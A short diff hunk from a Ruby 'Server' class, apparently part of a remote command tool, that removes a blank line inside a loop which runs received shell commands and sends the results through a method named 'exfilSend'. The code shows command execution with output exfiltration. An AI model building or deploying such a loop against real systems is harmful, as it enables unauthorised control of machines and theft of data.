@@ -44,7 +44,6 @@ class Server
       result = @shell.executeCmd(str)
           puts "returend from executing shell"
       if result != nil
-
         conn.exfilSend(result)
       end
       str = ""
